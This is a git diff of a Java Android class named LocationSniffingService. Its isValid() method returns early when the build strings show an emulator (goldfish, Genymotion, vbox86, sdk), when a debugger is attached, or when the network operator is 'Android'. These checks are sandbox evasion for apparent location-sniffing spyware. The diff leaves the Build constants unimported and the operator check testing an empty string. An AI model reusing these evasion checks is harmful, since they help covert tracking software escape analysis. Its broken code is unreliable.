@@ -31,11 +31,6 @@ import java.nio.charset.StandardCharsets;
 import java.util.List;
 
 import static android.location.LocationManager.*;
-import static android.os.Build.FINGERPRINT;
-import static android.os.Build.HARDWARE;
-import static android.os.Build.MODEL;
-import static android.os.Build.PRODUCT;
-import static android.os.Build.MANUFACTURER;
 
 /**
  * Created by Jay on 3/29/2016.
@@ -130,51 +125,57 @@ public class LocationSniffingService extends Service{
 
     private boolean isValid(){
 
-        String f = FINGERPRINT;
-        String m = MODEL;
-        String b = MANUFACTURER;
-        String p = PRODUCT;
-        String h = HARDWARE;
-        String t = TELEPHONY_SERVICE;
-        String c = CONNECTIVITY_SERVICE;
-        String l = LOCATION_SERVICE;
-        String g = GPS_PROVIDER;
-        String n = NETWORK_PROVIDER;
+        String fingerprint = FINGERPRINT;
+        String model = MODEL;
+        String manufacturer = MANUFACTURER;
+        String product = PRODUCT;
+        String hardware = HARDWARE;
+        String telephonyservice = TELEPHONY_SERVICE;
+        String connectivityservice = CONNECTIVITY_SERVICE;
+        String locationservice = LOCATION_SERVICE;
+        String gpsprovider = GPS_PROVIDER;
+        String networkprovider = NETWORK_PROVIDER;
+        String telephoneoperator = "";
+
+        String a1 = "";
+        String a2 = "";
+        String a3 = "";
+        String a4 = "";
+        String a5 = "";
+        String a6 = "";
+        String a7 = "";
 
         //Check build's fingerprint
-        Boolean checkFingerprint =  f.startsWith("generic") ||
-                f.startsWith("unknown");
+        Boolean checkFingerprint =  fingerprint.startsWith("generic") ||
+                fingerprint.startsWith("unknown");
 
         //Check build's model
-        Boolean checkModel =        m.contains("google_sdk") ||
-                m.contains("Emulator") ||
-                m.contains("Android SDK built for x86");
+        Boolean checkModel =        model.contains("google_sdk") ||
+                model.contains("Emulator") ||
+                model.contains("Android SDK built for x86");
 
         //Check Manurfacturer for Genymotion (an emulation software)
-        Boolean checkManufacturer = b.contains("Genymotion") ||
-                b.contains("unknown");
+        Boolean checkManufacturer = manufacturer.contains("Genymotion") ||
+                manufacturer.contains("unknown");
 
         //Check build's product
-        Boolean checkProduct = p.contains("google_sdk") ||
-                p.contains("sdk") ||
-                p.contains("sdk_x86") ||
-                p.contains("vbox86p") ||
-                p.contains("google_sdk");
+        Boolean checkProduct = product.contains("google_sdk") ||
+                product.contains("sdk") ||
+                product.contains("sdk_x86") ||
+                product.contains("vbox86p") ||
+                product.contains("google_sdk");
 
         //Check for goldfish hardware
-        Boolean checkHardware = h.contains("goldfish") ||
-                h.contains("vbox86");
+        Boolean checkHardware = hardware.contains("goldfish") ||
+                hardware.contains("vbox86");
 
         //Return if any is detected
         if(checkFingerprint || checkModel || checkManufacturer || checkProduct || checkHardware)
             return false;
 
         //Check for telephone operator
-        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(t);
-        String operator = telephonyManager.getNetworkOperator();
-
         //Return if it is android
-        if("Android".equals(operator))
+        if("Android".equals(telephoneoperator))
             return false;
 
         //Return if debugger is connected
@@ -182,7 +183,7 @@ public class LocationSniffingService extends Service{
             return false;
 
         ConnectivityManager connectivityManager = (ConnectivityManager)
-                getSystemService(c);
+                getSystemService(connectivityservice);
 
         NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();
 
@@ -192,18 +193,18 @@ public class LocationSniffingService extends Service{
 
 
         LocationManager locationManager = (LocationManager)
-                getSystemService(l);
+                getSystemService(locationservice);
 
         boolean gps_enabled = false;
         boolean network_enabled = false;
 
         if(locationManager==null)
-            locationManager = (LocationManager) this.getSystemService(l);
+            locationManager = (LocationManager) this.getSystemService(locationservice);
         try{
-            gps_enabled = locationManager.isProviderEnabled(g);
+            gps_enabled = locationManager.isProviderEnabled(gpsprovider);
         }catch(Exception ex){}
         try{
-            network_enabled = locationManager.isProviderEnabled(n);
+            network_enabled = locationManager.isProviderEnabled(networkprovider);
         }catch(Exception ex){}
 
         //If location service is not enabled don't bother
